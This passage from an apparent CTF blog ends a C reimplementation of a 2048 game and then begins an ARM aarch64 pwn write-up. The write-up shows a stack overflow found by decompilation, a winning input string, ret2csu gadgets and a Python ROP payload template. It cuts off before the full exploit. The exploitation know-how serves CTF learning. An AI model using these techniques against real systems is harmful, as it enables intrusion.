random_num)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> m;</span><br><span class="line">	<span class="keyword">int</span> re;</span><br><span class="line">	<span class="keyword">int</span> total=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">			m = i*<span class="number">4</span>+j;</span><br><span class="line">			<span class="keyword">if</span>(random_num==m)&#123;</span><br><span class="line">				<span class="keyword">if</span>(box[i][j]==<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					re = <span class="number">0</span>;	</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(box[i][j]!=<span class="number">0</span>)&#123;</span><br><span class="line">				total++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(total==<span class="number">16</span>)&#123;</span><br><span class="line">		re = <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">randomly_add</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> random_num1;</span><br><span class="line">	<span class="keyword">int</span> random_num2;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> key;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> m;</span><br><span class="line"></span><br><span class="line">	srand(time(<span class="number">0</span>));</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		random_num1 = rand() % <span class="number">16</span>;</span><br><span class="line">		key = check_repeat(random_num1);</span><br><span class="line">		<span class="keyword">if</span>(key == <span class="number">2</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(key == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">			m=i*<span class="number">4</span>+j;</span><br><span class="line">			<span class="keyword">if</span>(m==random_num1)&#123;</span><br><span class="line">				random_num2 = rand();</span><br><span class="line">				<span class="keyword">if</span>(random_num2 == (random_num2/<span class="number">10</span>)*<span class="number">10</span>)&#123;</span><br><span class="line">					num=<span class="number">2</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					num=<span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				box[i][j]=num;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">table_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=<span class="number">0</span>;j++)&#123;</span><br><span class="line">			box[i][j]=<span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	score=<span class="number">0</span>;</span><br><span class="line">	extra=<span class="number">0</span>;</span><br><span class="line">	win=<span class="number">0</span>;</span><br><span class="line">	lose=<span class="number">0</span>;</span><br><span class="line">	randomly_add();</span><br><span class="line">	randomly_add();</span><br><span class="line">	table_show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">table_check</span><span class="params">(<span class="keyword">int</span> extra_temp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line"></span><br><span class="line">	extra = extra_temp/<span class="number">2</span>;</span><br><span class="line">	score += extra_temp/<span class="number">2</span>;</span><br><span class="line">	lose = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">3</span>;++i)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=<span class="number">3</span>;++j)&#123;</span><br><span class="line">			<span class="keyword">if</span>(key[box[i][j]]==<span class="number">2048</span>)&#123;</span><br><span class="line">				win = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_left</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>,k=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(box[i][j]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(box[i][k]==box[i][j])&#123;</span><br><span class="line">					box[i][k]++;</span><br><span class="line">					box[i][j]=<span class="number">0</span>;</span><br><span class="line">					table_check(key[box[i][k]]);</span><br><span class="line">					k++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(box[i][k]==<span class="number">0</span>)&#123;</span><br><span class="line">					box[i][k]=box[i][j];</span><br><span class="line">					box[i][j]=<span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					box[i][++k]=box[i][j];</span><br><span class="line">					<span class="keyword">if</span>(j!=k)&#123;</span><br><span class="line">						box[i][j]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_right</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">2</span>,k=<span class="number">3</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">			<span class="keyword">if</span>(box[i][j]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(box[i][k]==box[i][j])&#123;</span><br><span class="line">					box[i][k]++;</span><br><span class="line">					box[i][j]=<span class="number">0</span>;</span><br><span class="line">					table_check(key[box[i][k]]);</span><br><span class="line">					k--;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(box[i][k]==<span class="number">0</span>)&#123;</span><br><span class="line">					box[i][k]=box[i][j];</span><br><span class="line">					box[i][j]=<span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					box[i][--k]=box[i][j];</span><br><span class="line">					<span class="keyword">if</span>(j!=k)&#123;</span><br><span class="line">						box[i][j]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_up</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>,k=<span class="number">0</span>;j&lt;<span class="number">4</span>;++j)&#123;</span><br><span class="line">			<span class="keyword">if</span>(box[j][i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(box[k][i]==box[j][i])&#123;</span><br><span class="line">					box[k][i]++;</span><br><span class="line">					box[j][i]=<span class="number">0</span>;</span><br><span class="line">					table_check(key[box[k][i]]);</span><br><span class="line">					k++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(box[k][i]==<span class="number">0</span>)&#123;</span><br><span class="line">					box[k][i]=box[j][i];</span><br><span class="line">					box[j][i]=<span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					box[++k][i]=box[j][i];</span><br><span class="line">					<span class="keyword">if</span>(j!=k)&#123;</span><br><span class="line">						box[j][i]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_down</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">2</span>,k=<span class="number">3</span>;j&gt;=<span class="number">0</span>;--j)&#123;</span><br><span class="line">			<span class="keyword">if</span>(box[j][i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(box[k][i]==box[j][i])&#123;</span><br><span class="line">					box[k][i]++;</span><br><span class="line">					box[j][i]=<span class="number">0</span>;</span><br><span class="line">					table_check(key[box[k][i]]);</span><br><span class="line">					k--;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(box[k][i]==<span class="number">0</span>)&#123;</span><br><span class="line">					box[k][i]=box[j][i];</span><br><span class="line">					box[j][i]=<span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					box[--k][i]=box[j][i];</span><br><span class="line">					<span class="keyword">if</span>(j!=k)&#123;</span><br><span class="line">						box[j][i]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">game</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> input;</span><br><span class="line">	table_init();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		extra = <span class="number">0</span>;</span><br><span class="line">		input = <span class="number">0</span>;</span><br><span class="line">		input = getchar();</span><br><span class="line">		randomly_add();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(input == <span class="string">&#x27;w&#x27;</span>)&#123;</span><br><span class="line">			move_up();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(input == <span class="string">&#x27;s&#x27;</span>)&#123;</span><br><span class="line">			move_down();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(input == <span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">			move_left();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(input == <span class="string">&#x27;d&#x27;</span>)&#123;</span><br><span class="line">			move_right();</span><br><span class="line">		&#125;</span><br><span class="line">		table_show();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(win==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;You are win~~,Thanks for your playing~~~\n&quot;</span>);</span><br><span class="line">			getchar();</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	tcgetattr(<span class="number">0</span>,&amp;old_config);</span><br><span class="line">	new_config = old_config;</span><br><span class="line">	new_config.c_lflag &amp;= ~ICANON;         </span><br><span class="line">	new_config.c_lflag &amp;= ~ECHO;        </span><br><span class="line">	new_config.c_cc[VMIN] = <span class="number">1</span>;          </span><br><span class="line">	new_config.c_cc[VTIME] = <span class="number">0</span>; </span><br><span class="line">	tcsetattr(<span class="number">0</span>, TCSANOW, &amp;new_config);</span><br><span class="line">	game();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>关于几个 move 的操作参考了网上的代码</li>
<li>而关于 game loss 的判断则没有写（IDA 太乱了）</li>
</ul>
<p>运行效果如下：</p>
<img src="/2022/08/31/C%E8%AF%AD%E8%A8%80%E7%89%882048/1661929880953.png" class width="1661929880953"> 
<img src="/2022/08/31/C%E8%AF%AD%E8%A8%80%E7%89%882048/1661929926875.png" class width="1661929926875"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/30/ARM%20pwn+ret2csu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/30/ARM%20pwn+ret2csu/" class="post-title-link" itemprop="url">ARM pwn+ret2csu</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-30 15:39:56 / Modified: 15:41:30" itemprop="dateCreated datePublished" datetime="2022-08-30T15:39:56+08:00">2022-08-30</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>2048 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
<ul>
<li>PS：ARM 的 libc 和 X86 的还不一样</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2048</span>: ELF <span class="number">64</span>-bit LSB executable, ARM aarch64, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so<span class="number">.1</span>, BuildID[sha1]=<span class="number">2</span>ad2206f21bc8a991f4874f2b2ca0cc6e6b973c0, <span class="keyword">for</span> GNU/Linux <span class="number">3.7</span><span class="number">.0</span>, stripped                  </span><br><span class="line">    Arch:     aarch64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，ARM，开了 NX，Full RELRO</li>
</ul>
<p>这是 ARM 的程序，需要用 qemu 来模拟 ARM 虚拟机（环境我已经搭好了）</p>
<p>使用如下命令来启动 qemu：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./[pwn]</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">20</span>]; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;You win!&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Do you want to continue playing? [y/n]: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);                       <span class="comment">// 栈溢出</span></span><br><span class="line">result = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> ( buf[<span class="number">0</span>] == <span class="string">&#x27;Y&#x27;</span> || buf[<span class="number">0</span>] == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> game_close();</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<ul>
<li>数组 buf 溢出，没有开 canary 可以直接打 ROP</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>在进行栈溢出之前，需要先完成一个游戏：2048</p>
<ul>
<li>B站学习视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Er4y1M7H6?spm_id_from=333.337.search-card.all.click&amp;vd_source=e57d5ad6d12068c1395d17b2d54c58d1">怎么玩2048_bilibili</a></li>
<li>在 github 上寻找 2048 的自动化脚本：<a target="_blank" rel="noopener" href="https://github.com/SrinidhiRaghavan/AI-2048-Puzzle">SrinidhiRaghavan/AI-2048-Puzzle</a></li>
</ul>
<p>逆向分析发现，这个程序通过 “W” “S” “A” “D” 4个键来控制程序（具体的实现过程可以先不用管），并且程序的种子是固定的</p>
<p>每一局游戏都是以下这个界面：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Score: <span class="number">0</span></span><br><span class="line">+------+------+------+------+</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |    <span class="number">2</span> |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|    <span class="number">2</span> |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">+------+------+------+------+</span><br></pre></td></tr></table></figure>
<ul>
<li>因此，只要完成一次游戏记录 payload 就可以了（我就没有跑脚本了，直接硬玩也可以）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;sddsdsdsddssssdddsddssddddwsdsdsddssdsdsssdsddddddsssddsddddadssdsdsddddssdddddadsssswssddsdsdssddadddsdddadsdssddsdddswwwdddsddadsdddaasdsddsdsdsddsdsddsdddssdsddsddddwsdsssddsadsdsdddsddsaddwwdsddsssddsdadadsdssasdadswsdaddssssswswdssddssdsdsadwdswwwswdsdsadassddsddddadaddssdasdsdsddsddsssdsdsddddsddddwssdssdswsdssdadadssswddadawwwwwdsdaasdsadsssdsddsdssdddswwwsddssasdwwwswswdddddsdssddddddsdswswswsdsadaasdddaaddsdassdsdasasddwwdddwdsdsddsddwddsadasdssdsswdsdsassddswwdwwswdadddassdsdsddwsddsadsssddsddsddaswasdsdssaddswsswsadsssssassdsdwwsssdsdsdddddsswwdwswsddssddsssssddsdssswssddswsddssddsddsssdswssssssddwddsdwsdswswsddwsdsssdasddadasddadsadsddddswdsasssswswsddsssssdsdwswdswswdsdsswsdsddsssadssdswsaaadsddssdswsswswddsddsdsssdadasdaassdwsdasdaadsdsddsddsadsdssssssddsdadsdsdsaddddsswdasasdddsddsadsdddsddsssdadadsaaddddssdwdddsadwdasddssddsssdsdsdddssaaaaasdsaddddswwdsdasswdwwswdsswsdsdddssswwsddssdwdssdsssssssdadsdadwdssdadddwddsddssdadddddddaadasddsddwdsdadaaaaaaadswds&#x27;</span></span><br></pre></td></tr></table></figure>
<p>接下来的 ROP 就是重头戏了，先介绍一下 ARM 的 ret2csu：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:                               loc_4020D8                              ; CODE XREF: sub_402070+<span class="number">3</span>C↑j</span><br><span class="line">.text: F3 <span class="number">53</span> <span class="number">41</span> A9                   LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text: F5 <span class="number">5B</span> <span class="number">42</span> A9                   LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text: F7 <span class="number">63</span> <span class="number">43</span> A9                   LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text: FD <span class="number">7B</span> C4 A8                   LDP             X29, X30, [SP+var_s0],#<span class="number">0x40</span></span><br><span class="line">.text: C0 <span class="number">03</span> <span class="number">5F</span> D6                   RET</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:                               loc_4020B8                              ; CODE XREF: sub_402070+<span class="number">64</span>↓j</span><br><span class="line">.text: A3 <span class="number">7</span>A <span class="number">73</span> F8                   LDR             X3, [X21,X19,LSL#<span class="number">3</span>]</span><br><span class="line">.text: E2 <span class="number">03</span> <span class="number">18</span> AA                   MOV             X2, X24</span><br><span class="line">.text: <span class="number">73</span> <span class="number">06</span> <span class="number">00</span> <span class="number">91</span>                   ADD             X19, X19, #<span class="number">1</span></span><br><span class="line">.text: E1 <span class="number">03</span> <span class="number">17</span> AA                   MOV             X1, X23</span><br><span class="line">.text: E0 <span class="number">03</span> <span class="number">16</span> <span class="number">2</span>A                   MOV             W0, W22</span><br><span class="line">.text: <span class="number">60</span> <span class="number">00</span> <span class="number">3F</span> D6                   BLR             X3</span><br></pre></td></tr></table></figure>
<ul>
<li><code>LDP &lt;reg0&gt;, &lt;reg1&gt;, [&lt;reg2|SP&gt;&#123;, #&lt;imm&gt;&#125;]</code>：<ul>
<li>把 <code>SP+&lt;imm&gt;</code>上的值存入<code>&lt;reg0&gt;, &lt;reg1&gt;</code></li>
<li>常用于恢复寄存器的数据</li>
<li>基地址偏移量模式，“{}”大括号表示可选的意思</li>
</ul>
</li>
<li><code>LDR &lt;reg0&gt;, [&lt;reg1&gt;, &lt;reg2&gt;, LSL#3]</code>：<ul>
<li>查找到 <code>&lt;reg1&gt;</code>（基地址）加上 <code>&lt;reg2&gt;</code> 右移3位（偏移地址）的地址</li>
<li>把其中的内容赋值给 <code>&lt;reg0&gt;</code></li>
</ul>
</li>
<li><code>BLR &lt;Xm&gt;</code>：<ul>
<li>跳转到由 <code>&lt;Xm&gt;</code> 目标寄存器指定的地址处</li>
<li>同时将下一条指令存放到 <code>&lt;X30&gt;</code> 寄存器中 </li>
</ul>
</li>
</ul>
<p>利用模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">csu1_addr = </span><br><span class="line">csu2_addr = </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">func_addr, arg0, arg1, arg2</span>):</span></span><br><span class="line">    payload = p64(csu1_addr) <span class="comment"># ret</span></span><br><span class="line">    payload += p64(csu1_addr) <span class="comment"># x29</span></span><br><span class="line">    payload += p64(csu2_addr) <span class="comment"># x30</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># x19</span></span><br><span class="line">    payload += p64(<span class="number">1</span>) <span class="comment"># x20</span></span><br><span class="line">    payload += p64(func_addr) <span class="comment"># x21</span></span><br><span class="line">    payload += p64(arg0) <span class="comment"># x22 (x0)</span></span><br><span class="line">    payload += p64(arg1) <span class="comment"># x23 (x1)</span></span><br><span class="line">    payload += p64(arg2) <span class="comment"># x24 (x2)</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：程序并不会直接调用 <code>func_addr</code>，而是会调用 <code>func_addr</code> 指向的地址</li>
</ul>
<p>最后说一下 ARM 环境的问题：</p>
<ul>
<li>绝大多数 <code>ARM</code> 架构的题都是在 <code>qemu</code> 模拟出的环境中跑的，而 <code>qemu</code> 没有 <code>NX</code> 和 <code>PIE</code>（即使题目所给的二进制文件开了 <code>NX</code> 和 <code>PIE</code> 保护，也只是对真机环境奏效），也就是说，<code>qemu</code> 中所有地址都是有可执行权限的（包括堆栈，甚至 <code>bss</code> 段等），然后 <code>libc_base</code> 和 <code>proc_base</code> 每次跑都是固定的</li>
<li>跑 <code>qemu</code> 的时候，<code>libc_base</code> 一般都是 <code>0x4000XXX000</code> 这样的地址，因此泄露数据的时候会被 <code>\x00</code> 截断，其实只需要泄露后三个字节（后六位），然后加上 <code>0x4000000000</code> 即可得到泄露出的 <code>libc</code> 地址（本地和远程的偏移可能不同）</li>
</ul>
<p>于是我们就先调用 GOT 里面的 <code>puts</code> 随便泄露一个 GOT 里面的函数，计算出 <code>libc_base</code>，然后利用 ret2csu 执行 ROP</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 